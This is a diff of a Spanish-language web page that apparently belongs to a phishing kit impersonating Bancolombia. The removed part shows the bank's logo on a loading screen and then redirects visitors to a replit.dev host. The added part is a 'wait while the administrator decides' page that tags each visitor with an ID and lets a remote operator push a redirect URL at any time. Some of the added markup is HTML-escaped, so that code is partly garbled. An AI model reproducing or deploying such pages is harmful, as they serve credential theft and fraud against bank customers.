@@ -1,48 +1,33 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Cargando...</title>
-  <style>
-    body {
-      margin: 0;
-      background-color: #ffffff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: Arial, sans-serif;
-    }
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Esperando decisión&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    <h2>Por favor espere mientras el administrador decide...</h2>
+    &lt;script&gt;
+        // Genera ID único para el usuario
+        let usuarioId = localStorage.getItem('usuarioId');
+        if (!usuarioId) {
+            usuarioId = Math.random().toString(36).substring(2, 12);
+            localStorage.setItem('usuarioId', usuarioId);
+        }
+        // Cambia la URL por la de tu Azure
+        fetch('https://TU_DOMINIO/api/esperar', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ usuarioId })
+        });
 
-    .banner {
-      background-color: white;
-      padding: 40px;
-      border-radius: 12px;
-      text-align: center;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-    }
-
-    .logo {
-      width: 150px;
-      margin-bottom: 20px;
-    }
-
-    .loader-gif {
-      width: 80px;
-    }
-  </style>
-  <script>
-    setTimeout(function () {
-      window.location.href = "https://97316aaf-9a6b-4182-a276-06e07ea36ede-00-2j3m8ubmahfxw.picard.replit.dev/";
-    }, 4000);
-  </script>
-</head>
-<body>
-  <div class="banner">
-    <img src="logobcol.png" alt="Logo Bancolombia" class="logo" />
-    <br>
-    <img src="loading.gif" alt="Cargando..." class="loader-gif" />
-  </div>
-</body>
-</html>
+        setInterval(() =&gt; {
+            fetch(`https://TU_DOMINIO/api/destino/${usuarioId}`)
+            .then(res =&gt; res.json())
+            .then(data =&gt; {
+                if (data.redirigir) {
+                    window.location.href = data.url;
+                }
+            });
+        }, 2000);
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
